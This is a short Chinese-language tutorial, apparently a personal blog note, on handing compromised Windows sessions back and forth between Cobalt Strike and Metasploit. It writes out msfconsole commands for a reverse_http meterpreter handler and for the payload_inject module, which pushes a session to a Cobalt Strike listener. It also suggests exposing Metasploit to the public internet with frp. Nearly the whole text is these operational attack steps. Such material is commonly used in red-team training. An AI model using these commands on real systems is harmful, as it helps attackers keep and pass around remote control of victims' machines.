如果是kali的msf要联动服务器上的CS的话，可以通过frp将msf映射到公网上

# CS ——> MSF

生成一个CS木马，然后先上线一台windows

![image-20231119121224915](images/1.png)

打开MSF，启动一个监听，用来监听CS派生过来的回话

```python3
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.50.128   (本机ip)
set lport 5555
exploit
```

<img src="images/6.png" alt="image-20231119121339182" style="zoom:50%;" />

CS创建新的监听器，地址为MSF地址，端口为MSF监听端口

<img src="images/7.png" alt="image-20231119121541581" style="zoom:50%;" />

然后在cs控制台输入spawn msftest

<img src="images/8.png" alt="image-20231119121657814"  />

也可以直接在已上线的主机点击右键点击spawn来选择监听器

![image-20231119122457493](images/2.png)

在msf中收到了会话，得到了meterpreter

<img src="images/9.png" alt="image-20231119121650247" style="zoom:50%;" />

# MSF ——> CS

接下来来尝试将刚才得到的meterpreter再派生到Cobalt Strike上

![image-20231119121919872](images/3.png)

在CS上创建监听

![image-20231119122035059](images/4.png)

这次使用10011这个监听

使用模块exploit/windows/local/payload_inject

```text
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set lhost 192.168.50.128     # 创建cs监听的地址
set lport 10011              # cs监听端口
set session 1
exploit
```

<img src="images/10.png" alt="image-20231119122227668" style="zoom:50%;" />

在CS上收到了会话

![image-20231119122301273](images/5.png)





https://zhuanlan.zhihu.com/p/381754822